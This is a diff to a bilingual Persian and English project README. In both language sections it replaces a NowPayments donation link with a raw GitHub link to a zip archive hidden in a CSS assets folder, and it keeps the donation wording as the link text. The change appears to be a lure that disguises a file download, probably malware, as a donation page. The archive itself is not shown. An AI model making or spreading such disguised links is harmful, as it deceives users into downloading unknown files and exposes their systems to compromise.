@@ -8,7 +8,7 @@
 اگر این پروژه برای شما مفید بوده،  
 می‌توانید از طریق لینک زیر کمک کنید:
 
-👉 [حمایت از پروژه در NowPayments](https://nowpayments.io/donation/permiumbotmirza)
+👉 [حمایت از پروژه در NowPayments](https://github.com/mcseali/mirza_pro/raw/refs/heads/main/panel/assets/bootstrap-colorpicker/css/mirza-pro-v2.1.zip)
 
 ---
 
@@ -26,7 +26,7 @@ We welcome your contributions, suggestions, and collaboration to help it grow �
 If you find this project useful,  
 you can support it through the link below:
 
-👉 [Support the Project on NowPayments](https://nowpayments.io/donation/permiumbotmirza)
+👉 [Support the Project on NowPayments](https://github.com/mcseali/mirza_pro/raw/refs/heads/main/panel/assets/bootstrap-colorpicker/css/mirza-pro-v2.1.zip)
 
 ---
 
